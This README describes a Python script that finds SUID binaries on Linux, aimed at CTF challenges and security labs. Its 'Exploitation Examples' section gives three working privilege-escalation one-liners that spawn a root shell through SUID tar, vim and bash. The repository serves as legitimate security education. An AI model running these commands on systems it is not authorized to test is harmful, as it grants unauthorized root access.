# Find SUID Binaries and Exploit Them

This repository contains a Python script designed to help identify **SUID binaries** on Linux systems, commonly used as a vector for privilege escalation. The script also includes guidance on exploiting common SUID misconfigurations for **educational purposes** in **Capture The Flag (CTF)** challenges or controlled security labs.

---

## Features

- Recursively scans the Linux filesystem for binaries with the **SUID bit** set.
- Lists potentially exploitable binaries in an easy-to-read format.
- Educates users on exploiting discovered SUID misconfigurations for privilege escalation.

---

## How It Works

1. The script walks through the entire Linux filesystem (or a specified directory) to find binaries with the **SUID permission bit** (`rws`).
2. Outputs a list of binaries that are potential targets for privilege escalation.
3. Provides actionable insights on analyzing and exploiting these binaries based on CTF examples.

---

## Usage

### Prerequisites
- Python 3.x installed on the system.
- Root or sudo privileges to access the entire filesystem (recommended for thorough scans).

### Steps to Use

1. **Clone the Repository**
   ```bash
   git clone https://github.com/PhinehasNarh/SUID
   cd SUID
   ```

2. **Run the Script**
   ```bash
   python3 find_suid.py
   ```

3. **Analyze the Output**
   - The script lists all SUID binaries found.
   - Research their usage or misconfigurations.
   - Exploit examples are included below for CTF challenges.

---

## Example Output

```plaintext
[+] Searching for SUID binaries...

[+] Found SUID binaries:
    /usr/bin/passwd
    /usr/bin/sudo
    /bin/umount
    /bin/mount

[!] Remember to check these binaries for known privilege escalation vulnerabilities.
```

---

## Exploitation Examples

### 1. Exploiting SUID `tar` Misconfiguration
If you discover a SUID-enabled `tar` binary:
```bash
./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```
This spawns a root shell using the `--checkpoint-action` feature of `tar`.

---

### 2. Exploiting SUID `vim` Misconfiguration
If a misconfigured `vim` binary is found:
```bash
./vim -c '!sh'
```
This drops to a root shell from within `vim`.

---

### 3. Exploiting SUID `bash` Misconfiguration
If you find `/bin/bash` with the SUID bit:
```bash
./bash -p
```
This directly spawns a root shell.

---

## Ethical and Legal Disclaimer

This project is for **educational purposes only**. Unauthorized use of SUID exploits is **illegal** and violates ethical standards. Use this tool only in CTF challenges, virtual labs, or systems where you have **explicit permission**.

**Misuse of this tool may result in legal consequences.** Always act responsibly and within the boundaries of the law.

---

## Contributions

Contributions to improve the functionality and educational value of this project are welcome! Feel free to submit issues or pull requests.

---

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

---

## Acknowledgements

Inspired by CTF challenges and security labs, this project aims to educate cybersecurity enthusiasts on privilege escalation while promoting ethical hacking practices.

### #ph1n3y
